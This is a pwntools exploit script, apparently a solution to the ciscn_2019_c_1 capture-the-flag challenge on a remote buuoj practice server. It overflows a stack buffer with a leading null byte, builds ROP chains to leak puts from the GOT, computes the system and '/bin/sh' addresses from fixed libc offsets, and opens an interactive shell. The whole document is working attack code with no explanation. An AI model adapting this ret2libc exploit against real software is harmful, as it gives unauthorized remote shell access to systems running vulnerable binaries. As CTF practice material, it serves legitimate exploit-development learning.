from pwn import *

context.log_level='debug'

p=remote('node5.buuoj.cn',28293)

elf=ELF("/home/lixingjian/pwn/ciscn_2019_c_1")

p.sendlineafter(b'choice!\n',b'1')

puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
encrypt_addr=elf.symbols['encrypt']

pop_rdi_addr=0x400c83
ret_addr=0x4006b9

payload1=b'\x00'+b'a'*(0x58-1)+p64(ret_addr)+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(encrypt_addr)

p.sendlineafter(b'encrypted\n',payload1)

p.recvline()
p.recvline()
puts_libc=u64(p.recvuntil(b'\n')[:-1].ljust(8,b'\x00'))
log.success(hex(puts_libc))

# libc=LibcSearcher('puts',puts_libc)
# libc=ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
# puts_offset=libc.symbols['puts']

# libc_base=puts_libc-puts_offset
# log.success(hex(libc_base))


system_addr=puts_libc-0x31580
binsh=puts_libc+0x1334da
log.success(hex(system_addr))
log.success(hex(binsh))

# p.recvuntil(b'choice!\n')
# p.sendline(b'1')

p.recvuntil(b'encrypted\n')

payload2=b'\x00'+b'a'*(0x58-1)+p64(pop_rdi_addr)+p64(binsh)+p64(ret_addr)+p64(system_addr)

p.sendline(payload2)

p.interactive()